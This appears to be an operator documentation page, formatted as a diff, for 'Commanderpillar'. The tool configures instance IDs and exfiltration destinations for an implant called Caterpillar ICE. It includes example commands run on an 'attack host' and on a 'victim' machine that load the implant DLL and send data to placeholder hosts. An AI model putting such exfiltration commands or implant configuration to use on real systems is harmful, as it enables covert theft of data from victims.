@@ -1,0 +1,56 @@
+
+                        Owner: User #71494
+Caterpillar ICE Command-Line Documentation
+Commanderpillar
+Commanderpillar is a command-line tool which generates base64 strings which Caterpillar knows how to interpret and use to modify the configuration.  Commanderpillar allows you to change two different parts of the burned-in Caterpillar config:
+
+The instance ID
+The set of transmission destinations
+
+Two important things to note: The changes are temporary.  This does not alter the burned-in configuration.  If you invoke Caterpillar without a command line string it will run with the configuration as it was burned in by the packaging script.  The set of destinations completely overrides the set of destinations burned-in by the packaging script, nothing about the destinations is used from the burned in configuration.
+ 
+Usage
+usage: commanderpillar [-h] [--id ID] [--dest ADDRESS PORT [SIZE]
+                       [ADDRESS PORT [SIZE] ...]]
+ 
+optional arguments:
+  -h, --help            show this help message and exit
+  --id ID               unique instance identifier for the Caterpillar
+                        (required)
+  --dest ADDRESS PORT [SIZE] [ADDRESS PORT [SIZE] ...]
+                        ip address/domain name and port to exfil data and
+                        optional per destination data cap (required, may be
+                        repeated)
+ 
+ 
+The usage and functionality for the options in Commanderpillar are identical to Builderpillar.  Please reference the Builderpillar documentation for in-depth descriptions of the --id and –dest options.
+ 
+Example
+Attack Host:
+User@AtkHst$./commanderpillar --id 42 --dest 1.2.3.4/30 1234 1234MB --dest mytraffic.com 5678 --dest 4.5.6.7 8765 200TBASoAAAACATEuMi4zLjQvMzAAMTIzNAAAACBNAAAAAAIAbXl0cmFmZmljLmNvbQA1Njc4AAAAAAAAAAAAAgE0LjUuNi43ADg3NjUAAAAAAADIAAD/
+ 
+On Target:
+Me@victim#./rice64.exe --Dll Caterpillar-ICE-64.dll --FireAndForget --NoVerify --Ordinal 1 --CmdLine ASoAAAACATEuMi4zLjQvMzAAMTIzNAAAACBNAAAAAAIAbXl0cmFmZmljLmNvbQA1Njc4AAAAAAAAAAAAAgE0LjUuNi43ADg3NjUAAAAAAADIAAD/
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+|
+                    
